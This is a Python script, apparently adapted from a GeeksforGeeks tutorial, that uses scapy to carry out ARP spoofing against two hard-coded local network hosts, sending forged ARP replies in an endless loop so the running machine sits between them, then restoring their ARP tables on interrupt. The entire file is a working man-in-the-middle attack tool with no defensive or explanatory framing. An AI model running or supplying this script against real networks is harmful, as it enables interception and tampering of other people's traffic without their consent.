import scapy.all as scapy
import time


## Script example from : https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
# 
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc
  
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
                                                            psrc = spoof_ip)
    scapy.send(packet, verbose = False)
  
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
      
  
target_1 = "192.168.88.202"
target_2 = "192.168.88.10"
  
try:
    sent_packets_count = 0
    while True:
        spoof(target_1, target_2)
        spoof(target_2, target_1)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        time.sleep(2) # Waits for two seconds
  
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(target_2, target_1)
    restore(target_1, target_2)
    print("[+] Arp Spoof Stopped")